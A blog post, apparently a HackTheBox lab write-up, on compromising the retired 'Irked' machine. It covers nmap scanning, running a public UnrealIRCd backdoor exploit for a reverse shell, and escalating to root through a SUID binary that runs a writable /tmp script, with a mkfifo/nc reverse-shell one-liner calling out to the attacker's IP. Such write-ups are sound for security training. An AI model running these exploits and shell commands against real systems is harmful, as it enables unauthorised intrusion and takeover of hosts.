<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>[HackTheBox] Irked Writeup - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="I worked on the Irked retired machine of HackTheBox, so I will write its writeup.
Port Scan kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.10.117 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA) | 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA) | 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA) |_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST |_http-server-header: Apache/2."><meta property="og:image" content><meta property="og:title" content="[HackTheBox] Irked Writeup"><meta property="og:description" content="I worked on the Irked retired machine of HackTheBox, so I will write its writeup.
Port Scan kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.10.117 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA) | 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA) | 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA) |_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST |_http-server-header: Apache/2."><meta property="og:type" content="article"><meta property="og:url" content="/posts/17/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-05-20T16:25:54+09:00"><meta property="article:modified_time" content="2022-05-20T16:25:54+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="[HackTheBox] Irked Writeup"><meta name=twitter:description content="I worked on the Irked retired machine of HackTheBox, so I will write its writeup.
Port Scan kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.10.117 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA) | 2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA) | 256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA) |_ 256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST |_http-server-header: Apache/2."><script src=/js/feather.min.js></script>
<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
<a href=/posts>Posts</a>
<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>[HackTheBox] Irked Writeup</h1><div class=meta>Posted on May 20, 2022</div></div><nav id=TableOfContents><ol><li><a href=#port-scan>Port Scan</a></li><li><a href=#port-6679>Port 6679</a></li><li><a href=#privilege-escalation-ircd---root>Privilege Escalation <code>ircd</code> -> <code>root</code></a></li><li><a href=#thoughts>Thoughts</a></li></ol></nav><section class=body><p>I worked on the Irked retired machine of HackTheBox, so I will write its writeup.</p><p><img src=/images/posts/17/label.png alt=label></p><h1 id=port-scan>Port Scan</h1><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.10.117
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn&#39;t have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          44470/udp6  status
|   100024  1          47934/tcp   status
|   100024  1          49257/udp   status
|_  100024  1          56691/tcp6  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
47934/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><h1 id=port-6679>Port 6679</h1><p>Use nmap script to find out if Unreal IRCd is vulnerable. You can see that it is actually a vulnerable version.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 irked.htb
Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-18 00:58 EDT
Nmap scan report for irked.htb (10.10.10.117)
Host is up (0.25s latency).
Not shown: 341 closed ports
PORT     STATE SERVICE VERSION
6697/tcp open  irc     UnrealIRCd
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.64 seconds
</code></pre><p>Use <a href=https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor>this exploit</a> to do a reverse shell.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ wget https://raw.githubusercontent.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/master/exploit.py
--2022-05-18 01:04:52--  https://raw.githubusercontent.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/master/exploit.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2195 (2.1K) [text/plain]
Saving to: ‘exploit.py’

exploit.py                                  100%[==========================================================================================&gt;]   2.14K  --.-KB/s    in 0s      

2022-05-18 01:04:52 (19.2 MB/s) - ‘exploit.py’ saved [2195/2195]
</code></pre><p>Modify the IP and port part of the attacker.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span><span style=color:#75715e># Sets the local ip and port (address and port to listen on)</span>
</span></span><span style=display:flex><span>local_ip <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;10.10.14.5&#39;</span>  <span style=color:#75715e># CHANGE THIS</span>
</span></span><span style=display:flex><span>local_port <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;4444&#39;</span>  <span style=color:#75715e># CHANGE THIS</span>
</span></span></code></pre></div><p>Execute script.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ python3 exploit.py -payload bash 10.10.10.117 6697
Exploit sent successfully!
</code></pre><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.117] 47434
bash: cannot set terminal process group (650): Inappropriate ioctl for device
bash: no job control in this shell
ircd@irked:~/Unreal3.2$ id
id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
</code></pre><h1 id=privilege-escalation-ircd---root>Privilege Escalation <code>ircd</code> -> <code>root</code></h1><p>When doing the enumeration for privilege escalation, I notice that there are some unfamiliar SUID file <code>/usr/bin/viewuser</code>.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>ircd@irked:~/Unreal3.2$ find / -type f -a \( -perm -u+s \) -exec ls -l {} \; 2&gt; /dev/null
&lt;d / -type f -a \( -perm -u+s \) -exec ls -l {} \; 2&gt; /dev/null              
-rwsr-xr-- 1 root messagebus 362672 Nov 21  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 9468 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 13816 Sep  8  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 562536 Nov 19  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 13564 Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
-rwsr-xr-x 1 root root 1085300 Feb 10  2018 /usr/sbin/exim4
-rwsr-xr-- 1 root dip 338948 Apr 14  2015 /usr/sbin/pppd
-rwsr-xr-x 1 root root 43576 May 17  2017 /usr/bin/chsh
-rwsr-sr-x 1 root mail 96192 Nov 18  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 78072 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 38740 May 17  2017 /usr/bin/newgrp
-rwsr-sr-x 1 daemon daemon 50644 Sep 30  2014 /usr/bin/at
-rwsr-xr-x 1 root root 18072 Sep  8  2016 /usr/bin/pkexec
-rwsr-sr-x 1 root root 9468 Apr  1  2014 /usr/bin/X
-rwsr-xr-x 1 root root 53112 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 52344 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser
-rwsr-xr-x 1 root root 96760 Aug 13  2014 /sbin/mount.nfs
-rwsr-xr-x 1 root root 38868 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 34684 Mar 29  2015 /bin/mount
-rwsr-xr-x 1 root root 34208 Jan 21  2016 /bin/fusermount
-rwsr-xr-x 1 root root 161584 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 26344 Mar 29  2015 /bin/umount
</code></pre><p>If you run it, you&rsquo;ll see that this script runs <code>/usr/bin/viewuser</code>.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>ircd@irked:~/Unreal3.2$ /usr/bin/viewuser
/usr/bin/viewuser
(unknown) :0           2022-05-19 08:59 (:0)
djmardov pts/0        2022-05-20 03:12 (10.10.14.6)
sh: 1: /tmp/listusers: not found
This application is being devleoped to set and test user permissions
It is still being actively developed
</code></pre><p>Make sure this script runs with root privileges.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>ircd@irked:~/Unreal3.2$ echo &#34;id&#34; &gt; /tmp/listusers
echo &#34;id&#34; &gt; /tmp/listusers

ircd@irked:~/Unreal3.2$ chmod +x  /tmp/listusers
chmod +x  /tmp/listusers

ircd@irked:~/Unreal3.2$ /usr/bin/viewuser
/usr/bin/viewuser
(unknown) :0           2022-05-19 08:59 (:0)
djmardov pts/0        2022-05-20 03:12 (10.10.14.6)
uid=0(root) gid=1001(ircd) groups=1001(ircd)
This application is being devleoped to set and test user permissions
It is still being actively developed
</code></pre><p>Do a reverse shell and get a shell with root privileges.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>ircd@irked:~/Unreal3.2$ echo &#39;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.6 4242 &gt;/tmp/f&#39; &gt; /tmp/listusers
&lt;p/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.6 4242 &gt;/tmp/f&#39; &gt; /tmp/listusers 
ircd@irked:~/Unreal3.2$ /usr/bin/viewuser
/usr/bin/viewuser
(unknown) :0           2022-05-19 08:59 (:0)
</code></pre><p>Get the user flag and the root flag.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ nc -nlvp 4242
listening on [any] 4242 ...                                                                                                                                                    
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.117] 53024                                                                                                                    
# id                                                                                                                                                                           
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)         
# cat /home/djmardov/Documents/user.txt
*************************
# cat /root/root.txt
*************************
</code></pre><h1 id=thoughts>Thoughts</h1><p>It took me a while to notice the existence of <code>/usr/bin/viewuser</code>, but it was a simple and wonderful machine.</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/hackthebox>hackthebox</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>